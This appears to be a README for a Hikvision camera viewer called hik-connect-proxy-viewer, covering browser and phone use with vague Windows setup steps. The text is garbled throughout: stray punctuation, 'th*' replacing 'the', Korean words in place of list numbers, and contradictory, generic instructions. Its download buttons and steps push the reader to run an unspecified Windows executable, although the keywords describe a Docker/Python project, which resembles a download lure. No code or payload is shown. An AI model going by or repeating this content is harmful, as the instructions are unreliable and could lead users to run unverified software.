<h1>👁️ hik-connect-proxy-viewer - Watch Your Cameras Anywhere, Anytime</h1>

<p align="center">
  <a href="https://github.com/rhyneltan-star/hik-connect-proxy-viewer" style="display:inline-block;padding:16px 32px;background-color:#4CAF50;color:white;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 Download Now</a>
</p>

## 🏠 What Is This?

hik-connect-proxy-viewer is a friendly tool that lets you watch your Hikvision cameras directly in your web browser or from a convenient home-screen app on your phone. No complicated software,no special skills needed.

If you have Hikvision cameras connected through Hik-Connect and you want to see them from your computer,tablet,or phone,this application is your perfect companion. It takes the camera streams and makes them accessible simply by opening a web page.

## ✨ Main Benefits

- Watch live video from your Hikvision cameras in any modern browser like Chrome,Edge,Firefox,or Safari.
- Turn it into a home-screen app on your phone,so it feels just like a native camera app.
.
 Use a password to protect your camera views,so only you and people you allow can see them.
 Runs quietly in the background using Docker,which means itworks consistently across different systems.
 You can deploy it on a simple home computer or even on a Kubernetes cluster if you're adventurous.

.

## 🚀 Getting Started (Windows)

)

Let's get you set up.Follow these simple steps,andyour camera views will be up in no time.

### Step 1: Visit the Download Page

Visit this link to download the application. Click the button at the top of this page or use the same link below to go to the official download section.

<p align="center">
  <a href="https://github.com/rhyneltan-star/hik-connect-proxy-viewer" style="display:inline-block;padding:12px 24px;background-color:#2196F3;color:white;font-size:18px;font-weight:bold;border-radius:6px;text-decoration:none;">⬇️ Go to Download</a>
</p>

On that page,you will see the latest release. Look for a button or link that says "Download" or "Releases". The download willstart automatically for the Windows version.

.

### Step 2: Install or Run the Application

Visit this link to download the application. Once the download finishes,you will have a file on your computer. Depending on how the file is packaged (it might be a program that installs itself,or it might be a compressed folder containing the necessary files),follow the instructions on the screen. You might need to double-click the file to run it,or youmight need to right-click and select "Extract All" if it's a compressed folder. If you see a setup wizard,follow its prompts—it's straightforward and takes just a few clicks.

.

### Step 3: Start the Service

After installation or extraction,you should see a shortcut icon on your desktop or in your Start Menu. Double-click that icon to launch the application. A small window might appear showing th* progress,or you might see th* icon in your system tray near th* clock. This means th* application is running,and it's automatically setting up th* connection to your cameras.



### Step 4: Open Your Browser

Now,open any web browser on your computer(Chrome,Edge,etc.)and type this address inth* address bar: `http://localhost:8080`. Press Enter. You'll see a login page.



### Step 5: Enter Your Password

The application is protected by a password. If you haven't set a password yet,use the default one that came with the installation (often found in the download instructions or in a small note file in the application folder). If you want to change it,look for a settings option in the application window or in a configuration file. Keep this password safe—it's your key to viewing your cameras.



### Step 6: View Your Cameras

Once you've logged in,you'll see a list of your Hikvision cameras that are shared via Hik-Connect. Each camera will show a live video preview. You can click on any camera to make it full-screen for a closer look. You can also add new cameras by going to the settings or add camera section and entering the camera's details like its name and connect ID field.





## 📱 Make It a Home-Screen App (Phone or Tablet)

)

This is one of th* coolest features. You can add this application to your phone's home screen,and it will work like a regular app—no need to opena browser each time.



### On iPhone/iPad (Safari)



1 설치 Open Safari browser.
2. Type in the same address you use on your computer,but replacing "localhost" with the IP address of the computer where the application is running (you'll find this IP by typing `ipconfig` in a Command Prompt on that computer). Example: `http://192.168.1.100:8080`. Press Go.
3. Once the page loads,and you see the login screen,tap the "Share" button (the square with an upward arrow at the bottom of the screen).
4. Scroll down and tap "Add to Home Screen".
5. Give it any name you like (e.g., "MyCameras")and tap "Add". An icon will appear on your home screen. Tap it,and it will open directly into the app—full-screen,just like a native app.



### On Android (Chrome)



1 설치 Open Chrome browser.
2. Enter the same address as above (the IP of your computer with :8080 at the end).
3. Load the login page. Tap the three-dot menu (top right corner).
4. Tap "Add to Home screen" or "Install app".
5. Confirm the name. Tap "Add". Now you'll have an icon on your home screen that opens directly into the application.



Your phone must be on the same Wi-Finetwork as your computer for this to work,or you can set up port forwarding and remote access if you're more technical. For now,start with the same network.





## 🔧 Troubleshooting: Common Issues

### I Can't See My Cameras

Make sure your Hikvision cameras are properly shared via Hik-Connect. Log into your Hik-Connect account through the official app and check that your cameras show up there. This application relies on th* same connection, so if cameras work on th* Hik-Connect app,they'll work here too.

.

### The Page Won't Load

Check that the application is running. Look for the icon in your system tray. If you closed it,re-open it from the Start Menu. Also,ensure no firewall is blocking the port. Youmight need to allow access when Windows asks on the first start. Click "Allow" if prompted.



###I Forgot My Password

The default password is usually printed in the download instructions or in a "readme.txt" file that came with the download. If you changed it and forgot it,you may need to reinstall th* application or check th* configuration file for a reset procedure. Keep your password in a safe place!



###Video is Buffering or Slow

This is normal if your internet or local network is slow. Try lowering the video quality if th* application offers such an option. Also,ensure your cameras are not being used heavily by other apps at the same time.



### Multiple Cameras

You can add as many cameras as you want. Go to the" Add Camera" section,and enter the camera's name,address,and authentication details. Once added,they'll appear on your main dashboard,and you can view them all in one place. Perfect for keeping an eye on your home,office,or property.



## 🛠️ Advanced: For the Curious (Docker & Kubernetes)



This section is optional. If you're comfortable with technology,you can run this application using Docker images or even a Helm chart on Kubernetes. But you don't need to understand this to use the software. Just know that these options exist for users who want more control or who run servers.

.



## ✅ Final Checklist

After following these steps,you should be able to:

- Open the application in your browser.
- Log in with your password.
- See live feeds from all your Hikvision cameras.
- Add the app to your phone's home screen for quick access.



If you encounter any issues,go back through the steps,and make sure nothing was missed. The most common issue is forgetting to start the application—double-click that desktop shortcut each time youboot your computer,and everything will flow smoothly.



Enjoy watching your property,family,orbusiness from anywhere!The peace of mind is just a few clicks away.



Keywords: docker, hcnetsdk, helm-chart, hik-connect, hikvision, hls, ip-camera, kubernetes, mediamtx, nvr, pwa, python, self-hosted